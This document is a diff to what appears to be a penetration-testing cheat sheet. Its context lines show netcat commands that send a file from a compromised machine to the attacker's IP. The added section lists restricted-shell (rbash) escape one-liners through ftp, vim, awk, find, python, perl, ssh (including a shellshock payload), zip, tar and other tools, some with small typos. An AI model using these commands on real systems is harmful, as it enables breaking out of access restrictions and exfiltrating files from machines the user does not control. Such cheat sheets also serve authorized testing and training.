@@ -51,3 +51,28 @@ nc -lnvp 6666 > file
 # In vuln machine
 nc -w 3 <your ip> 6666 < file
 ```
+### How to escape rbash
+```shell
+ftp > !/bin/sh or !/bin/bash
+gdb > !/bin/sh or !/bin/bash
+more/man/less > !/bin/sh or !/bin/bash
+vim > !/bin/sh or !/bin/bash
+vim > :python import os; os.system("/bin/bash )
+scp > scp -S /path/yourscript x y:
+awk > awk 'BEGIN {system("/bin/sh or /bin/bash")}'
+10) From find > find / -name test -exec /bin/sh or /bin/bash \;
+except > except spawn sh then sh.
+python > python -c 'import os; os.system("/bin/sh")'
+php > php -a then exec("sh -i");
+perl > perl -e 'exec "/bin/sh";'
+lua > os.execute('/bin/sh').
+ruby > exec "/bin/sh"
+ssh > ssh username@IP - t "/bin/sh" or "/bin/bash"
+ssh2 > ssh username@IP -t "bash --noprofile"
+ssh3 > ssh username@IP -t "() { :; }; /bin/bash" (shellshock)
+ssh4 > ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID)
+git > git help status > you can run it then !/bin/bash
+pico > pico -s "/bin/bash" then you can write /bin/bash and then CTRL + T
+zip > zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
+tar > tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
+```
